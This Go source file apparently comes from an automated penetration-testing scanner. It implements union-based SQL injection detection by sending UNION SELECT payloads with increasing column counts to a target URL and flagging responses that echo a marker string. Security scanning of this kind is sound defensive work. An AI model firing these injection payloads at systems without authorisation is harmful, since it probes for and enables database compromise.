package detection

import (
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/autonomouspen/scanner/internal/common"
)

type UnionBased struct{}

func (u *UnionBased) Detect(target string, ctx context.Context) ([]common.Finding, error) {
	var findings []common.Finding
	injectionMarker := "UNIONSELECT"

	for i := 1; i < 20; i++ {
		var columns []string
		for j := 0; j < i; j++ {
			columns = append(columns, fmt.Sprintf("'%s'", injectionMarker))
		}
		payload := fmt.Sprintf("' UNION SELECT %s --", strings.Join(columns, ","))

		resp, err := http.Get(target + payload)
		if err != nil {
			continue
		}
		body, _ := ioutil.ReadAll(resp.Body)

		if strings.Contains(string(body), injectionMarker) {
			findings = append(findings, common.Finding{
				Type:       "Union-based SQLi",
				Severity:   "High",
				URL:        target + payload,
				Evidence:   "Injected data was found in the response.",
				Confidence: "High",
				CWE:        "CWE-89",
				CVSS:       8.8,
			})
			break
		}
	}

	return findings, nil
}
